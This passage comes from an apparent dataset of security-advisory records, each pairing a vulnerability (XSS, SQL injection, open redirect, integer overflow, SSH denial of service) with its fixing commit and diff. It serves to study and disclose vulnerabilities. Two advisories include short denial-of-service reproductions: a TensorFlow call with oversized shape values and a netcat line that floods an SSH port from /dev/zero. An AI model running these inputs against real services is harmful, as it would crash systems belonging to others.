policy](https:\/\/github.com\/puma\/puma\/security\/policy)","published_date":"2022-02-11","chain_len":1,"project":"https:\/\/github.com\/puma\/puma","commit_href":"https:\/\/github.com\/puma\/puma\/commit\/b70f451fe8abc0cff192c065d549778452e155bb","commit_sha":"b70f451fe8abc0cff192c065d549778452e155bb","patch":"SINGLE","chain_ord":"['b70f451fe8abc0cff192c065d549778452e155bb']","before_first_fix_commit":"{'15dd1166ac0750e74720fecee7904e6069ad6d7f'}","last_fix_commit":"b70f451fe8abc0cff192c065d549778452e155bb","chain_ord_pos":1.0,"commit_datetime":"02\/11\/2022, 14:58:08","message":"Ensure `close` is called on the response body no matter what\n\nAnother fallout from https:\/\/github.com\/puma\/puma\/pull\/2809 is that\nin some cases the `res_body.close` wasn't called because some previous code\nraised.\n\nFor Rails apps it means CurrentAttributes and a few other important\nstates aren't reset properly.\n\nThis is being improved on the Rails side too, but I believe it would\nbe good to harden this on the puma side as well.","author":"Jean Boussier","comments":null,"stats":"{'additions': 10, 'deletions': 5, 'total': 15}","files":"{'lib\/puma\/request.rb': {'additions': 10, 'deletions': 5, 'changes': 15, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/puma\/puma\/raw\/b70f451fe8abc0cff192c065d549778452e155bb\/lib%2Fpuma%2Frequest.rb', 'patch': '@@ -171,11 +171,16 @@ def handle_request(client, lines, requests)\\n         end\\n \\n       ensure\\n-        uncork_socket io\\n-\\n-        body.close\\n-        client.tempfile.unlink if client.tempfile\\n-        res_body.close if res_body.respond_to? :close\\n+        begin\\n+          uncork_socket io\\n+\\n+          body.close\\n+          client.tempfile.unlink if client.tempfile\\n+        ensure\\n+          # Whatever happens, we MUST call `close` on the response body.\\n+          # Otherwise Rack::BodyProxy callbacks may not fire and lead to various state leaks\\n+          res_body.close if res_body.respond_to? :close\\n+        end\\n \\n         after_reply.each { |o| o.call }\\n       end'}}","message_norm":"ensure `close` is called on the response body no matter what\n\nanother fallout from https:\/\/github.com\/puma\/puma\/pull\/2809 is that\nin some cases the `res_body.close` wasn't called because some previous code\nraised.\n\nfor rails apps it means currentattributes and a few other important\nstates aren't reset properly.\n\nthis is being improved on the rails side too, but i believe it would\nbe good to harden this on the puma side as well.","language":"en","entities":"[('ensure', 'ACTION', ''), ('https:\/\/github.com\/puma\/puma\/pull\/2809', 'URL', ''), ('improved', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/puma\/request.rb'])","num_files":1.0},{"index":2972,"vuln_id":"GHSA-rp34-85x3-3764","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/librenms\/librenms\/commit\/135717a9a05c5bf8921f1389cbb469dcbf300bfd'}","dataset":"osv","summary":"Cross-site Scripting in librenms Cross-site Scripting (XSS) - Generic in Packagist librenms\/librenms prior to 22.1.0.","published_date":"2022-02-15","chain_len":1,"project":"https:\/\/github.com\/librenms\/librenms","commit_href":"https:\/\/github.com\/librenms\/librenms\/commit\/135717a9a05c5bf8921f1389cbb469dcbf300bfd","commit_sha":"135717a9a05c5bf8921f1389cbb469dcbf300bfd","patch":"SINGLE","chain_ord":"['135717a9a05c5bf8921f1389cbb469dcbf300bfd']","before_first_fix_commit":"{'c7b63b574f31efdeaa376d1a1cc0e7da681cba9f'}","last_fix_commit":"135717a9a05c5bf8921f1389cbb469dcbf300bfd","chain_ord_pos":1.0,"commit_datetime":"02\/13\/2022, 10:00:56","message":"security - XSS Fix 01\n\nfixing https:\/\/huntr.dev\/bounties\/114ba055-a2f0-4db9-aafb-95df944ba177\/ (#13775)","author":"PipoCanaja","comments":null,"stats":"{'additions': 3, 'deletions': 3, 'total': 6}","files":"{'includes\/html\/forms\/alert-transports.inc.php': {'additions': 3, 'deletions': 3, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/librenms\/librenms\/raw\/135717a9a05c5bf8921f1389cbb469dcbf300bfd\/includes%2Fhtml%2Fforms%2Falert-transports.inc.php', 'patch': \"@@ -34,10 +34,10 @@\\n $status = 'ok';\\n $message = '';\\n \\n-$transport_id = $vars['transport_id'];\\n-$name = $vars['name'];\\n+$transport_id = strip_tags($vars['transport_id']);\\n+$name = strip_tags($vars['name']);\\n $is_default = (int) (isset($vars['is_default']) && $vars['is_default'] == 'on');\\n-$transport_type = $vars['transport-type'];\\n+$transport_type = strip_tags($vars['transport-type']);\\n \\n if (empty($name)) {\\n     $status = 'error';\"}}","message_norm":"security - xss fix 01\n\nfixing https:\/\/huntr.dev\/bounties\/114ba055-a2f0-4db9-aafb-95df944ba177\/ (#13775)","language":"en","entities":"[('security', 'SECWORD', ''), ('xss', 'SECWORD', ''), ('fix', 'ACTION', ''), ('fixing', 'ACTION', ''), ('https:\/\/huntr.dev\/bounties\/114ba055-a2f0-4db9-aafb-95df944ba177\/', 'URL', ''), ('#13775', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['includes\/html\/forms\/alert-transports.inc.php'])","num_files":1.0},{"index":2978,"vuln_id":"GHSA-rp7r-79rm-2758","cwe_id":"{'CWE-200'}","score":0.0,"chain":"{'https:\/\/github.com\/apache\/derby\/commit\/fd24a7590ff5426bac68303fbeca07dbc5067412', 'https:\/\/github.com\/apache\/derby\/commit\/09a7325f75a4f96a7735e46c9723930f88ea2613', 'https:\/\/github.com\/apache\/derby\/commit\/82d721fd53e30dbb86d6d742c085030985091968'}","dataset":"osv","summary":"Apache Derby exposes user and password attributes Apache Derby before 10.1.2.1 exposes the (1) user and (2) password attributes in cleartext via (a) the RDBNAM parameter of the ACCSEC command and (b) the output of the DatabaseMetaData.getURL function, which allows context-dependent attackers to obtain sensitive information.","published_date":"2022-05-01","chain_len":3,"project":"https:\/\/github.com\/apache\/derby","commit_href":"https:\/\/github.com\/apache\/derby\/commit\/09a7325f75a4f96a7735e46c9723930f88ea2613","commit_sha":"09a7325f75a4f96a7735e46c9723930f88ea2613","patch":"MULTI","chain_ord":"['09a7325f75a4f96a7735e46c9723930f88ea2613', '82d721fd53e30dbb86d6d742c085030985091968', 'fd24a7590ff5426bac68303fbeca07dbc5067412']","before_first_fix_commit":"{'90f16141b17352af5c934f3cf8bdbbb90c40624e'}","last_fix_commit":"fd24a7590ff5426bac68303fbeca07dbc5067412","chain_ord_pos":1.0,"commit_datetime":"09\/09\/2005, 19:50:58","message":"DERBY-561 - Embedded driver jdbcCompliant() method should return true\nTest will be checked in as part of tess for DERBY-530\n\n\n\ngit-svn-id: https:\/\/svn.apache.org\/repos\/asf\/db\/derby\/code\/trunk@279860 13f79535-47bb-0310-9956-ffa450edef68","author":"Katherine Marsden","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'java\/engine\/org\/apache\/derby\/jdbc\/InternalDriver.java': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/apache\/derby\/raw\/09a7325f75a4f96a7735e46c9723930f88ea2613\/java%2Fengine%2Forg%2Fapache%2Fderby%2Fjdbc%2FInternalDriver.java', 'patch': '@@ -209,7 +209,7 @@ public int getMinorVersion() {\\n \\t}\\r\\n \\r\\n \\tpublic boolean jdbcCompliant() {\\r\\n-\\t\\treturn false;\\r\\n+\\t\\treturn true;\\r\\n \\t}\\r\\n \\r\\n \\t\/*'}}","message_norm":"derby-561 - embedded driver jdbccompliant() method should return true\ntest will be checked in as part of tess for derby-530\n\n\n\ngit-svn-id: https:\/\/svn.apache.org\/repos\/asf\/db\/derby\/code\/trunk@279860 13f79535-47bb-0310-9956-ffa450edef68","language":"en","entities":"[('https:\/\/svn.apache.org\/repos\/asf\/db\/derby\/code\/trunk@279860', 'URL', ''), ('13f79535', 'SHA', 'generic_sha'), ('ffa450edef68', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['java\/engine\/org\/apache\/derby\/jdbc\/InternalDriver.java'])","num_files":1.0},{"index":2981,"vuln_id":"GHSA-rphc-h572-2x9f","cwe_id":"{'CWE-434', 'CWE-79'}","score":9.0,"chain":"{'https:\/\/github.com\/star7th\/showdoc\/commit\/92bc6a83a3a60e01a0d2effb98ab47d8d7eab28f'}","dataset":"osv","summary":"Cross-site Scripting in showdoc\/showdoc ShowDoc is a tool greatly applicable for an IT team to share documents online. showdoc\/showdoc allows .properties files to upload which lead to stored XSS in versions prior to 2.10.4. This allows attackers to execute malicious scripts in the user's browser. This issue was patched in version 2.10.4. There is currently no known workaround.","published_date":"2022-03-15","chain_len":1,"project":"https:\/\/github.com\/star7th\/showdoc","commit_href":"https:\/\/github.com\/star7th\/showdoc\/commit\/92bc6a83a3a60e01a0d2effb98ab47d8d7eab28f","commit_sha":"92bc6a83a3a60e01a0d2effb98ab47d8d7eab28f","patch":"SINGLE","chain_ord":"['92bc6a83a3a60e01a0d2effb98ab47d8d7eab28f']","before_first_fix_commit":"{'cd258a0de6fad53a5f41beaf2645f3f6f092f216'}","last_fix_commit":"92bc6a83a3a60e01a0d2effb98ab47d8d7eab28f","chain_ord_pos":1.0,"commit_datetime":"03\/14\/2022, 14:36:28","message":"file upload bug","author":"star7th","comments":null,"stats":"{'additions': 4, 'deletions': 4, 'total': 8}","files":"{'server\/Application\/Api\/Model\/AttachmentModel.class.php': {'additions': 4, 'deletions': 4, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/star7th\/showdoc\/raw\/92bc6a83a3a60e01a0d2effb98ab47d8d7eab28f\/server%2FApplication%2FApi%2FModel%2FAttachmentModel.class.php', 'patch': \"@@ -324,13 +324,13 @@ public function isDangerFilename($filename){\\n \\tpublic function isAllowedFilename($filename){\\n \\t\\t$allow_array = array(\\n \\t\\t\\t'.jpg','.jpeg','.png','.bmp','.gif','.ico','.webp',\\n-\\t\\t\\t'.mp3','.wav','.m4a','.ogg','.webma','.mp4','.flv',\\n+\\t\\t\\t'.mp3','.wav','.mp4',\\n \\t\\t\\t'.mov','.webmv','.flac','.mkv',\\n-\\t\\t\\t'.zip','.tar','.gz','.tgz','.ipa','.apk','.rar','.iso','.bz2','.epub',\\n+\\t\\t\\t'.zip','.tar','.gz','.tgz','.ipa','.apk','.rar','.iso',\\n \\t\\t\\t'.pdf','.ofd','.swf','.epub','.xps',\\n-\\t\\t\\t'.doc','.docx','.odt','.rtf','.docm','.dotm','.dot','.dotx','.wps',\\n+\\t\\t\\t'.doc','.docx','.wps',\\n \\t\\t\\t'.ppt','.pptx','.xls','.xlsx','.txt','.psd','.csv',\\n-\\t\\t\\t'.cer','.ppt','.pub','.properties','.json','.css',\\n+\\t\\t\\t'.cer','.ppt','.pub','.json','.css',\\n \\t\\t\\t) ;\\n \\n \\t\\t$ext = strtolower(substr($filename,strripos($filename,'.')) ); \/\/\u83b7\u53d6\u6587\u4ef6\u6269\u5c55\u540d\uff08\u8f6c\u4e3a\u5c0f\u5199\u540e\uff09\"}}","message_norm":"file upload bug","language":"ro","entities":"[('bug', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['server\/Application\/Api\/Model\/AttachmentModel.class.php'])","num_files":1.0},{"index":2996,"vuln_id":"GHSA-rr8m-29g8-8cgc","cwe_id":"{'CWE-89'}","score":8.8,"chain":"{'https:\/\/github.com\/forkcms\/forkcms\/commit\/6aca30e10b4181534f73f96d6e2ebeb45ec15069'}","dataset":"osv","summary":"SQL Injection in Fork CMS Fork CMS is vulnerable to SQL injection through marking blog comments on bulk as spam in versions prior to 5.11.1.","published_date":"2022-03-26","chain_len":1,"project":"https:\/\/github.com\/forkcms\/forkcms","commit_href":"https:\/\/github.com\/forkcms\/forkcms\/commit\/6aca30e10b4181534f73f96d6e2ebeb45ec15069","commit_sha":"6aca30e10b4181534f73f96d6e2ebeb45ec15069","patch":"SINGLE","chain_ord":"['6aca30e10b4181534f73f96d6e2ebeb45ec15069']","before_first_fix_commit":"{'1b38e33a98992793e998a937b717355212346993'}","last_fix_commit":"6aca30e10b4181534f73f96d6e2ebeb45ec15069","chain_ord_pos":1.0,"commit_datetime":"03\/23\/2022, 12:21:47","message":"Prevent sql injection through the ids of the blog comments","author":"Jelmer Prins","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/Backend\/Modules\/Blog\/Engine\/Model.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/forkcms\/forkcms\/raw\/6aca30e10b4181534f73f96d6e2ebeb45ec15069\/src%2FBackend%2FModules%2FBlog%2FEngine%2FModel.php', 'patch': \"@@ -501,7 +501,7 @@ public static function getComments(array $ids): array\\n             'SELECT *\\n              FROM blog_comments AS i\\n              WHERE i.id IN (' . implode(', ', array_fill(0, count($ids), '?')) . ')',\\n-            $ids\\n+            array_map('intval', $ids)\\n         );\\n     }\"}}","message_norm":"prevent sql injection through the ids of the blog comments","language":"en","entities":"[('prevent', 'ACTION', ''), ('sql injection', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/Backend\/Modules\/Blog\/Engine\/Model.php'])","num_files":1.0},{"index":3007,"vuln_id":"GHSA-rrx2-r989-2c43","cwe_id":"{'CWE-190'}","score":6.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1b54cadd19391b60b6fcccd8d076426f7221d5e8', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e952a89b7026b98fe8cbe626514a93ed68b7c510'}","dataset":"osv","summary":"Integer overflows in Tensorflow ### Impact \nThe [implementations of `Sparse*Cwise*` ops](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/5100e359aef5c8021f2e71c7b986420b85ce7b3d\/tensorflow\/core\/kernels\/sparse_dense_binary_op_shared.cc) are vulnerable to integer overflows. These can be used to trigger large allocations (so, OOM based denial of service) or `CHECK`-fails when building new `TensorShape` objects (so, assert failures based denial of service):\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.raw_ops.SparseDenseCwiseDiv(\n    sp_indices=np.array([[9]]),\n    sp_values=np.array([5]),\n    sp_shape=np.array([92233720368., 92233720368]),\n    dense=np.array([4]))\n```\n\nWe are missing some validation on the shapes of the input tensors as well as directly constructing a large `TensorShape` with user-provided dimensions. The latter is an instance of [TFSA-2021-198](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/tensorflow\/security\/advisory\/tfsa-2021-198.md) (CVE-2021-41197) and is easily fixed by replacing a call to `TensorShape` constructor with a call to `BuildTensorShape` static helper factory.\n\n### Patches\nWe have patched the issue in GitHub commits [1b54cadd19391b60b6fcccd8d076426f7221d5e8](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1b54cadd19391b60b6fcccd8d076426f7221d5e8) and [e952a89b7026b98fe8cbe626514a93ed68b7c510](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e952a89b7026b98fe8cbe626514a93ed68b7c510).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.","published_date":"2022-02-09","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1b54cadd19391b60b6fcccd8d076426f7221d5e8","commit_sha":"1b54cadd19391b60b6fcccd8d076426f7221d5e8","patch":"MULTI","chain_ord":"['1b54cadd19391b60b6fcccd8d076426f7221d5e8', 'e952a89b7026b98fe8cbe626514a93ed68b7c510']","before_first_fix_commit":"{'1b54cadd19391b60b6fcccd8d076426f7221d5e8'}","last_fix_commit":"e952a89b7026b98fe8cbe626514a93ed68b7c510","chain_ord_pos":1.0,"commit_datetime":"12\/10\/2021, 17:46:39","message":"Add missing validation to sparse dense cwise ops.\n\nPiperOrigin-RevId: 415543133\nChange-Id: I5baf3284e919338afb96178c468ad3d3cb0d956c","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 13, 'deletions': 0, 'total': 13}","files":"{'tensorflow\/core\/kernels\/sparse_dense_binary_op_shared.cc': {'additions': 13, 'deletions': 0, 'changes': 13, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/1b54cadd19391b60b6fcccd8d076426f7221d5e8\/tensorflow%2Fcore%2Fkernels%2Fsparse_dense_binary_op_shared.cc', 'patch': '@@ -78,11 +78,24 @@ class SparseDenseBinaryOpShared : public OpKernel {\\n                     \"but received shapes: \",\\n                     values_t->shape().DebugString(), \" and \",\\n                     shape_t->shape().DebugString()));\\n+    OP_REQUIRES(\\n+        ctx, TensorShapeUtils::IsVector(shape_t->shape()),\\n+        errors::InvalidArgument(\"Input sp_shape must be a vector. Got: \",\\n+                                shape_t->shape().DebugString()));\\n     OP_REQUIRES(\\n         ctx, values_t->dim_size(0) == indices_t->dim_size(0),\\n         errors::InvalidArgument(\\n             \"The first dimension of values and indices should match. (\",\\n             values_t->dim_size(0), \" vs. \", indices_t->dim_size(0), \")\"));\\n+    OP_REQUIRES(\\n+        ctx, shape_t->shape().dim_size(0) == indices_t->shape().dim_size(1),\\n+        errors::InvalidArgument(\\n+            \"Number of dimensions must match second dimension of indices. \",\\n+            \"Got \", shape_t->shape().dim_size(0),\\n+            \" dimensions, indices shape: \", indices_t->shape().DebugString()));\\n+    OP_REQUIRES(ctx, shape_t->NumElements() > 0,\\n+                errors::InvalidArgument(\\n+                    \"The shape argument requires at least one element.\"));\\n \\n     const auto indices_mat = indices_t->matrix<int64_t>();\\n     const auto shape_vec = shape_t->vec<int64_t>();'}}","message_norm":"add missing validation to sparse dense cwise ops.\n\npiperorigin-revid: 415543133\nchange-id: i5baf3284e919338afb96178c468ad3d3cb0d956c","language":"en","entities":"[('add', 'ACTION', ''), ('missing validation', 'SECWORD', ''), ('415543133', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/sparse_dense_binary_op_shared.cc'])","num_files":1.0},{"index":3008,"vuln_id":"GHSA-rrx2-r989-2c43","cwe_id":"{'CWE-190'}","score":6.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1b54cadd19391b60b6fcccd8d076426f7221d5e8', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e952a89b7026b98fe8cbe626514a93ed68b7c510'}","dataset":"osv","summary":"Integer overflows in Tensorflow ### Impact \nThe [implementations of `Sparse*Cwise*` ops](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/5100e359aef5c8021f2e71c7b986420b85ce7b3d\/tensorflow\/core\/kernels\/sparse_dense_binary_op_shared.cc) are vulnerable to integer overflows. These can be used to trigger large allocations (so, OOM based denial of service) or `CHECK`-fails when building new `TensorShape` objects (so, assert failures based denial of service):\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.raw_ops.SparseDenseCwiseDiv(\n    sp_indices=np.array([[9]]),\n    sp_values=np.array([5]),\n    sp_shape=np.array([92233720368., 92233720368]),\n    dense=np.array([4]))\n```\n\nWe are missing some validation on the shapes of the input tensors as well as directly constructing a large `TensorShape` with user-provided dimensions. The latter is an instance of [TFSA-2021-198](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/tensorflow\/security\/advisory\/tfsa-2021-198.md) (CVE-2021-41197) and is easily fixed by replacing a call to `TensorShape` constructor with a call to `BuildTensorShape` static helper factory.\n\n### Patches\nWe have patched the issue in GitHub commits [1b54cadd19391b60b6fcccd8d076426f7221d5e8](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1b54cadd19391b60b6fcccd8d076426f7221d5e8) and [e952a89b7026b98fe8cbe626514a93ed68b7c510](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e952a89b7026b98fe8cbe626514a93ed68b7c510).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.","published_date":"2022-02-09","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e952a89b7026b98fe8cbe626514a93ed68b7c510","commit_sha":"e952a89b7026b98fe8cbe626514a93ed68b7c510","patch":"MULTI","chain_ord":"['1b54cadd19391b60b6fcccd8d076426f7221d5e8', 'e952a89b7026b98fe8cbe626514a93ed68b7c510']","before_first_fix_commit":"{'1b54cadd19391b60b6fcccd8d076426f7221d5e8'}","last_fix_commit":"e952a89b7026b98fe8cbe626514a93ed68b7c510","chain_ord_pos":2.0,"commit_datetime":"12\/10\/2021, 17:46:48","message":"Prevent overflow in sparse dense cwise ops.\n\nPiperOrigin-RevId: 415543171\nChange-Id: I22dab7c41be2121ab5efe5403ca0e2f9b7cb24b8","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 3, 'deletions': 1, 'total': 4}","files":"{'tensorflow\/core\/kernels\/sparse_dense_binary_op_shared.cc': {'additions': 3, 'deletions': 1, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/e952a89b7026b98fe8cbe626514a93ed68b7c510\/tensorflow%2Fcore%2Fkernels%2Fsparse_dense_binary_op_shared.cc', 'patch': '@@ -99,7 +99,9 @@ class SparseDenseBinaryOpShared : public OpKernel {\\n \\n     const auto indices_mat = indices_t->matrix<int64_t>();\\n     const auto shape_vec = shape_t->vec<int64_t>();\\n-    const auto lhs_dims = BCast::FromShape(TensorShape(shape_vec));\\n+    TensorShape lhs_shape;\\n+    OP_REQUIRES_OK(ctx, TensorShape::BuildTensorShape(shape_vec, &lhs_shape));\\n+    const auto lhs_dims = BCast::FromShape(lhs_shape);\\n     const auto rhs_dims = BCast::FromShape(dense_t->shape());\\n     BCast b(lhs_dims, rhs_dims, false);  \/\/ false for keeping the same num dims.'}}","message_norm":"prevent overflow in sparse dense cwise ops.\n\npiperorigin-revid: 415543171\nchange-id: i22dab7c41be2121ab5efe5403ca0e2f9b7cb24b8","language":"en","entities":"[('prevent', 'ACTION', ''), ('overflow', 'SECWORD', ''), ('415543171', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/sparse_dense_binary_op_shared.cc'])","num_files":1.0},{"index":3010,"vuln_id":"GHSA-rv62-4pmj-xw6h","cwe_id":"{'CWE-601'}","score":6.1,"chain":"{'https:\/\/github.com\/jupyter\/notebook\/commit\/08c4c898182edbe97aadef1815cce50448f975cb', 'https:\/\/github.com\/jupyter\/notebook\/commit\/70fe9f0ddb3023162ece21fbb77d5564306b913b', 'https:\/\/github.com\/jupyter\/notebook\/commit\/d65328d4841892b412aef9015165db1eb029a8ed'}","dataset":"osv","summary":"Moderate severity vulnerability that affects jupyterhub and notebook An Open Redirect vulnerability for all browsers in Jupyter Notebook before 5.7.8 and some browsers (Chrome, Firefox) in JupyterHub before 0.9.6 allows crafted links to the login page, which will redirect to a malicious site after successful login. Servers running on a base_url prefix are not affected.","published_date":"2019-04-02","chain_len":3,"project":"https:\/\/github.com\/jupyter\/notebook","commit_href":"https:\/\/github.com\/jupyter\/notebook\/commit\/08c4c898182edbe97aadef1815cce50448f975cb","commit_sha":"08c4c898182edbe97aadef1815cce50448f975cb","patch":"MULTI","chain_ord":"['70fe9f0ddb3023162ece21fbb77d5564306b913b', 'd65328d4841892b412aef9015165db1eb029a8ed', '08c4c898182edbe97aadef1815cce50448f975cb']","before_first_fix_commit":"{'d65328d4841892b412aef9015165db1eb029a8ed'}","last_fix_commit":"08c4c898182edbe97aadef1815cce50448f975cb","chain_ord_pos":3.0,"commit_datetime":"03\/27\/2019, 20:43:40","message":"protect against chrome mishandling backslash as slash in URLs","author":"Min RK","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'notebook\/auth\/login.py': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jupyter\/notebook\/raw\/08c4c898182edbe97aadef1815cce50448f975cb\/notebook%2Fauth%2Flogin.py', 'patch': '@@ -39,6 +39,10 @@ def _redirect_safe(self, url, default=None):\\n         \"\"\"\\n         if default is None:\\n             default = self.base_url\\n+        # protect chrome users from mishandling unescaped backslashes.\\n+        # \\\\ is not valid in urls, but some browsers treat it as \/\\n+        # instead of %5C, causing `\\\\\\\\` to behave as `\/\/`\\n+        url = url.replace(\"\\\\\\\\\", \"%5C\")\\n         parsed = urlparse(url)\\n         if parsed.netloc or not (parsed.path + \\'\/\\').startswith(self.base_url):\\n             # require that next_url be absolute path within our path'}}","message_norm":"protect against chrome mishandling backslash as slash in urls","language":"en","entities":"[('protect', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['notebook\/auth\/login.py'])","num_files":1.0},{"index":3012,"vuln_id":"GHSA-rv62-4pmj-xw6h","cwe_id":"{'CWE-601'}","score":6.1,"chain":"{'https:\/\/github.com\/jupyter\/notebook\/commit\/08c4c898182edbe97aadef1815cce50448f975cb', 'https:\/\/github.com\/jupyter\/notebook\/commit\/70fe9f0ddb3023162ece21fbb77d5564306b913b', 'https:\/\/github.com\/jupyter\/notebook\/commit\/d65328d4841892b412aef9015165db1eb029a8ed'}","dataset":"osv","summary":"Moderate severity vulnerability that affects jupyterhub and notebook An Open Redirect vulnerability for all browsers in Jupyter Notebook before 5.7.8 and some browsers (Chrome, Firefox) in JupyterHub before 0.9.6 allows crafted links to the login page, which will redirect to a malicious site after successful login. Servers running on a base_url prefix are not affected.","published_date":"2019-04-02","chain_len":3,"project":"https:\/\/github.com\/jupyter\/notebook","commit_href":"https:\/\/github.com\/jupyter\/notebook\/commit\/d65328d4841892b412aef9015165db1eb029a8ed","commit_sha":"d65328d4841892b412aef9015165db1eb029a8ed","patch":"MULTI","chain_ord":"['70fe9f0ddb3023162ece21fbb77d5564306b913b', 'd65328d4841892b412aef9015165db1eb029a8ed', '08c4c898182edbe97aadef1815cce50448f975cb']","before_first_fix_commit":"{'d65328d4841892b412aef9015165db1eb029a8ed'}","last_fix_commit":"08c4c898182edbe97aadef1815cce50448f975cb","chain_ord_pos":2.0,"commit_datetime":"03\/27\/2019, 15:19:10","message":"changelog for redirect check\n\nand update cve for 5.7.6","author":"Min RK","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'docs\/source\/changelog.rst': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jupyter\/notebook\/raw\/d65328d4841892b412aef9015165db1eb029a8ed\/docs%2Fsource%2Fchangelog.rst', 'patch': '@@ -31,21 +31,21 @@ We strongly recommend that you upgrade pip to version 9+ of pip before upgrading\\n - Further improve compatibility with tornado 6 with improved\\n   checks for when websockets are closed.\\n - Fix regression in 5.7.6 on Windows where .js files could have the wrong mime-type.\\n+- Fix Open Redirect vulnerability where certain malicious URLs could redirect from the Jupyter login page to a malicious site after a successful login. A CVE has been requested for this vulnerability.\\n \\n .. _release-5.7.6:\\n \\n 5.7.6\\n -----\\n \\n-5.7.6 contains a security fix for a cross-site inclusion (XSSI) vulnerability,\\n+5.7.6 contains a security fix for a cross-site inclusion (XSSI) vulnerability (CVE-2019\u20139644),\\n where files at a known URL could be included in a page from an unauthorized website if the user is logged into a Jupyter server.\\n The fix involves setting the ``X-Content-Type-Options: nosniff``\\n header, and applying CSRF checks previously on all non-GET\\n API requests to GET requests to API endpoints and the \/files\/ endpoint.\\n \\n The attacking page is able to access some contents of files when using Internet Explorer through script errors,\\n but this has not been demonstrated with other browsers.\\n-A CVE has been requested for this vulnerability.\\n \\n .. _release-5.7.5:'}}","message_norm":"changelog for redirect check\n\nand update cve for 5.7.6","language":"en","entities":"[('changelog', 'ACTION', ''), ('update', 'ACTION', ''), ('cve', 'SECWORD', ''), ('5.7.6', 'VERSION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['docs\/source\/changelog.rst'])","num_files":1.0},{"index":3014,"vuln_id":"GHSA-rv6r-3f5q-9rgx","cwe_id":"{'CWE-120'}","score":7.5,"chain":"{'https:\/\/github.com\/twisted\/twisted\/commit\/98387b39e9f0b21462f6abc7a1325dc370fcdeb1', 'https:\/\/github.com\/twisted\/twisted\/commit\/89c395ee794e85a9657b112c4351417850330ef9'}","dataset":"osv","summary":"Twisted SSH client and server deny of service during SSH handshake. ### Impact\n\nThe Twisted SSH client and server implementation naively accepted an infinite amount of data for the  peer's SSH version identifier.\n\nA malicious peer can trivially craft a request that uses all available memory and crash the server, resulting in denial of service. The attack is as simple as `nc -rv localhost 22 < \/dev\/zero`.\n\n### Patches\n\nThe issue was fix in GitHub commit https:\/\/github.com\/twisted\/twisted\/commit\/98387b39e9f0b21462f6abc7a1325dc370fcdeb1\n\nA fix is available in Twisted 22.2.0.\n\n### Workarounds\n\n* Limit access to the SSH server only to trusted source IP addresses.\n* Connect over SSH only to trusted destination IP addresses.\n\n### References\n\nReported at https:\/\/twistedmatrix.com\/trac\/ticket\/10284\nDiscussions at https:\/\/github.com\/twisted\/twisted\/security\/advisories\/GHSA-rv6r-3f5q-9rgx\n\n### For more information\n\nFound by 